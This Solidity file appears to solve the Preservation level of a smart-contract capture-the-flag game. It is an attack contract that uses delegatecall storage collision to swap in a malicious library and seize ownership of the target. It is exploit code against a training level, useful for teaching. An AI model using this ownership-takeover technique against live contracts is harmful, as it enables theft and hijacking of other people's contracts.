// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Preservation.sol";

contract AttackHelper {
    Preservation public preservation;
    address public maliciousLibrary;
    
    constructor(address _preservation, address _maliciousLibrary) {
        preservation = Preservation(_preservation);
        maliciousLibrary = _maliciousLibrary;
    }
    
    function attack() external {
        // Step 1: Overwrite timeZone1Library with our malicious contract address
        preservation.setFirstTime(uint256(uint160(maliciousLibrary)));
        
        // Step 2: Call setFirstTime again, which will now delegatecall to our malicious contract
        // Pass the deployer address as uint256 to set as owner
        preservation.setFirstTime(uint256(uint160(msg.sender)));
    }
}